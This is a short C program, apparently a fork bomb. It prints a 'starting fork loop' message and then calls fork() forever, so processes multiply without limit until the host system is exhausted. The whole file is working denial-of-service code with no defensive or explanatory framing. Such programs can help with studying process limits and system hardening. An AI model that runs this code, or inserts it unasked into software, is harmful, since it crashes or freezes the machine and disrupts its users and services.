#include <stdio.h>
#include <unistd.h>

int main(void)
{
    printf("[fork_bomb] starting fork loop (pid=%d)\n", getpid());

    while (1)
    {
        fork();
    }

    return 0;
}
